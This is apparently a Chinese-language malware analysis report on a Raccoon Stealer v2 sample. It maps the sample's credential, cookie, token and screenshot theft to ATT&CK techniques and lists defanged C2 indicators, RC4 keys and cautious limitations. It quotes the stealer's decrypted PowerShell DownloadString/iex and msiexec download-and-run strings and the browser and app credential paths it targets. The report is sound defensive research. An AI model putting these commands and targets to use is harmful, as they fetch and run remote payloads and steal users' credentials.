---
title: "恶意样本分析：Raccoon Stealer v2（PE · exe · 3bb5bf52）"
published: 2026-11-02
draft: false
description: "恶意（置信度中）：Raccoon Stealer v2 · stealer/loader · 难度 medium · 动态沙箱 + 静态反编译"
tags: ["Raccoon v2", "stealer", "loader", "PE"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Raccoon Stealer v2**（存疑） · 置信度 **中**
> 
> 别名：Raccoon、RecordBreaker、Raccoon v2
> 
> 样本内置经 RC4+Base64 混淆的完整窃取配置，并在真实动态环境中被观测到向 C2 发送加密注册信标；静态与动态证据一致指向凭据/会话/令牌窃取及二阶段下载能力。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Raccoon Stealer v2** · 别名 Raccoon、RecordBreaker、Raccoon v2 · _存疑_ |
| 置信度 | **中** |
| 行为类 | stealer · loader |
| 难度 | medium |
| 首次出现 | 2026-11-01 11:32:37 |
| 分析方法 | 动态沙箱分析 + 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/3bb5bf520eb23961d31d5af97d67bea6fff6e111c96eac490044c5b9720a04af/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解密内置配置</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">注册C2回传HWID</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">窃取浏览器凭据</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1555.003</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">解密Chrome v20密钥</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1555.003</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">窃取Cookie会话</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1539</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `3bb5bf520eb23961d31d5af97d67bea6fff6e111c96eac490044c5b9720a04af` |
| MD5 | _未记录_ |
| 大小 | 634,880 字节（620.0 KB） |
| 类型 | PE · `exe` |

## 行为分析

共 **11** 条行为，每条都挂了证据；其中 **10** 条静态可得、**1** 条经动态分析取得。

### 1. 解密内置配置

`T1027` · 置信度 **高** · 静态

启动早期以固定密钥初始化 RC4 表，对 .rdata 中的 Base64 字符串逐条 RC4 解密，恢复 421 条 C2、路径、字段名与 API 名称。

> **证据**：0x270c 写入 RC4 key；0x2be88 Base64 解码；0x2bb04 RC4；解密结果含 C2 与全部窃取模块
> 
> **来源**：`ev-000020` · `ev-000022` · `ev-000023` · `ev-000024` · `ev-000025`

### 2. 注册C2回传HWID

`T1071.001` · 置信度 **高** · 动态

运行后向 162.35.243[.]151:80 发送 RC4 加密的注册 JSON，包含 build=new6、受害机 HWID 与 type=create。

> **证据**：动态网络：进程 2196 于启动后 POST hxxp://162.35.243[.]151:80；载荷解密为 {build:new6, hwid:3F26AF00-0FAF-A434-EBC8-47BCC3105FC4, type:create}
> 
> **来源**：`ev-000024` · `ev-000025` · `ref:1039bc62d7`

### 3. 窃取浏览器凭据

`T1555.003` · 置信度 **高** · 静态

定位 Chrome/Brave/Edge 的 Local State 与 Login Data，读取加密凭据并通过 CryptUnprotectData/BCrypt 解密用户名与口令。

> **证据**：解密字符串：\Google\Chrome\User Data\Local State、\BraveSoftware\Brave-Browser\User Data\Local State、\Microsoft\Edge\User Data\Local State；.data 0x8d280 的 app_bound_encrypted_key；导入 CryptUnprotectData/BCryptDecrypt
> 
> **来源**：`ev-000025` · `ref:952aed24eb`

### 4. 解密Chrome v20密钥

`T1555.003` · 置信度 **高** · 静态

解析 Local State 中的 app_bound_encrypted_key（APPB 前缀），使用 BCrypt AES-GCM 解出浏览器主密钥以解密新版 Cookie。

> **证据**：解密字符串：app_bound_encrypted_key、APPB、use_v20；API 字符串：BCryptGenerateSymmetricKey、BCryptDecrypt、ChainingModeGCM
> 
> **来源**：`ev-000025`

### 5. 窃取Cookie会话

`T1539` · 置信度 **高** · 静态

读取 cookies.sqlite 的 host_key/encrypted_value/expires_utc，并解析 Login Data、Web Data、History 中的登录、自动填充、信用卡与历史记录。

> **证据**：解密字符串：cookies.sqlite、encrypted_value、host_key、expires_utc、Login Data、Web Data、credit_cards、autofill、History
> 
> **来源**：`ev-000025`

### 6. 窃取Discord令牌

`T1528` · 置信度 **高** · 静态

遍历 Discord 的 Local Storage/leveldb 与 IndexedDB，提取本地及同步令牌并写入 tokens.txt。

> **证据**：解密字符串：\discord\Local Storage\leveldb、from_local、from_sync、from_IndexedDB、soft\Discord\tokens.txt
> 
> **来源**：`ev-000025`

### 7. 窃取Steam令牌

`T1528` · 置信度 **高** · 静态

读取 Steam 安装路径、ssfn*、config.vdf、loginusers.vdf 与 ConnectCache，导出 SteamID 与令牌。

> **证据**：解密字符串：Software\Valve\Steam、SteamPath、ssfn*、config.vdf、loginusers.vdf、ConnectCache、soft\Steam\tokens\steam_tokens.txt
> 
> **来源**：`ev-000025`

### 8. 窃取邮件与FTP凭据

`T1555` · 置信度 **高** · 静态

解析 Outlook 多版本 Profiles 注册表、Foxmail Account.rec0 与 WinSCP Sessions 注册表，导出邮箱与 FTP 主机/账号/口令。

> **证据**：解密字符串：Windows Messaging Subsystem\Profiles、Office\13.0-16.0\Outlook\Profiles、\Accounts\Account.rec0、WinSCP 2\Sessions、soft\Outlook\outlook.txt、soft\WinSCP\winscp.txt
> 
> **来源**：`ev-000025`

### 9. 截屏并采集主机信息

`T1113, T1082` · 置信度 **高** · 静态

通过 GDI+ 截取桌面为 screenshot.jpg，并汇总用户名、计算机名、OS、CPU/GPU、内存、显示器、进程列表与已安装软件。

> **证据**：解密字符串：BitBlt、GdipSaveImageToStream、screenshot.jpg、System Summary、Process List、Installed Apps、Display Resolution；动态内存中加载 gdiplus/gdi32
> 
> **来源**：`ev-000025` · `ref:1039bc62d7`

### 10. 分片上传窃取数据

`T1041` · 置信度 **中** · 静态

将窃取结果打包，以 application/json 的 opcode/data/upload_file 字段和 part_index/total_parts 分片 POST 至 C2。

> **证据**：解密字符串：Content-Type: application/json、opcode、data、filename、upload_file、part_index、total_parts、waiting/missing/failed；动态已观测到同源 POST 注册请求
> 
> **来源**：`ev-000025` · `ref:1039bc62d7`

### 11. 下载执行二阶段载荷

`T1105, T1059.001` · 置信度 **中** · 静态

内置 loader 配置，可通过 PowerShell DownloadString+iex 或 msiexec /passive 下载并执行远程 EXE/MSI。

> **证据**：解密字符串：C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe、-nop -c、iex(New-Object Net.WebClient).DownloadString('、C:\Windows\system32\msiexec.exe、/passive、loader/set_load/loader_id
> 
> **来源**：`ev-000025`


## IOC（已去武器化）

### 网络

:::note
**已动态观测到连接**：样本实际向该目标发起 TCP 连接（短时间内多次重试）。
:::

:::caution
**真实服务器侧仍未验证**：上述连接/握手是与本地受控仿真服务完成的，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://162[.]35[.]243[.]151` | 80 | c2 | 动态 | 已观测 |

### 主机

**落地路径**

- `%PROGRAMDATA%\soft\Discord\tokens.txt`
- `%PROGRAMDATA%\soft\Steam\tokens\steam_tokens.txt`
- `%PROGRAMDATA%\soft\Outlook\outlook.txt`
- `%PROGRAMDATA%\soft\WinSCP\winscp.txt`
- `%PROGRAMDATA%\soft\FoxMail\`
- `%PROGRAMDATA%\screenshot.jpg`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `hxxp://162[.]35[.]243[.]151` | 是 | 动态 |
| `c2_port` | `80` | 是 | 动态 |
| `campaign_id` | `new6` | 是 | 动态 |
| `victim_hwid` | `3F26AF00-0FAF-A434-EBC8-47BCC3105FC4` | 是 | 动态 |
| `encryption_algo` | `RC4 + Base64（配置字符串与 C2 JSON）；Chrome v20 使用 BCrypt AES-GCM` | 是 | 静态 |
| `rc4_config_key` | `amsoWeYCyfFL5DurLo` | 是 | 静态 |
| `rc4_c2_key` | `ZH29EQfFE9gbsuqFZ2` | 是 | 动态 |
| `output_dir` | `C:\ProgramData\` | 是 | 静态 |
| `upload_protocol` | `HTTP POST application/json; fields opcode/data/upload_file/part_index/total_parts` | 是 | 静态 |
| `theft_modules` | `browsers,cookies,logins,history,webdata,discord,steam,outlook,foxmail,winscp,screenshot,system_info,process_list,installed_apps` | 是 | 静态 |
| `stage2_download` | `powershell -nop -c iex(New-Object Net.WebClient).DownloadString(...); msiexec /passive` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 仅凭出现 BCrypt/AES-GCM 与 CryptUnprotectData 不能判定为勒索软件；这些 API 用于解密 Chrome v20 应用绑定密钥与浏览器凭据，未观察到任何文件加密或勒索信。
- 未观测到服务、计划任务或 Run 键写入，不能声称具备持久化能力；配置中存在 self_delete 选项，倾向窃取后自清理。
- 虽然解析了 WriteProcessMemory/VirtualAllocEx/QueueUserAPC 等 API 名称，但未取得实际调用链，不能据此断言进程注入。
- 家族归因为候选（Raccoon/RecordBreaker 特征），未经同源签名确认，不能当作已定论。
- 未捕获二阶段样本，不能描述其具体载荷或后续行为。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析 + 静态反编译 |
| 脱壳 | 否 |

**局限与待验证**

1. 动态环境仅捕获注册信标与一次 C2 POST，未捕获完整日志上传或二阶段下载；宿主机无真实浏览器数据，窃取量可能不完整。
2. 输出路径与文件组合来自静态解密字符串，未在动态中逐一确认，标记为待动态复核。
3. 家族归因基于协议、目录布局与模块组合的相似性，未取得同源 YARA/面板指纹，仍为候选。
4. 未观察到持久化、进程注入或提权成功的行为，因此未将其列为已确认行为。
5. 样本运行后退出且部分进程记录显示已消失，无法量化完整外传数据。

## 证据索引

<details>
<summary>展开 12 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 哈希与指纹 | sha256=3bb5bf52...a04af，文件大小 634880 |
| `ev-000002` | scan.imphash | imphash=a1fa2d08960884e06f2dc59bd5f7a43c |
| `ev-000010` | 字符串提取 | ASCII/UTF-16 字符串与 .data 中的浏览器路径、app_bound_encrypted_key |
| `ev-000020` | decompile.function | FUN_140009ba4：Base64+RC4 解密入口 |
| `ev-000022` | decompile.function | FUN_14002be88：标准 Base64 解码 |
| `ev-000023` | decompile.function | FUN_14002bb04：RC4 实现 |
| `ev-000024` | decompile.function | FUN_14000270c：写入 RC4 密钥并批量解密配置字符串 |
| `ev-000025` | evidence.record | 脚本解密 421 条字符串并解出 C2 注册 JSON（自述证据，置信度上限 0.7） |
| `ref:952aed24eb` | 导入表解析 | KERNEL32 91 个导入，含 LoadLibraryA/GetProcAddress/VirtualProtect 等 |
| `ref:1039bc62d7` | 动态分析平台 | 真实动态：进程 2196 POST 162.35.243[.]151:80，捕获 RC4 注册 JSON；进程随后退出 |
| `ref:690ec78685` | scan.entropy | 整体熵 6.194，各段熵均低于 7，无加壳迹象 |
| `c2_evidence:3bb5bf52` | 连接证据提取 | 动态网络监控记录到 2 次到 162.35.243[.]151:80, 162[.]35[.]243[.]151:80 的连接尝试；未捕获完整会话 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
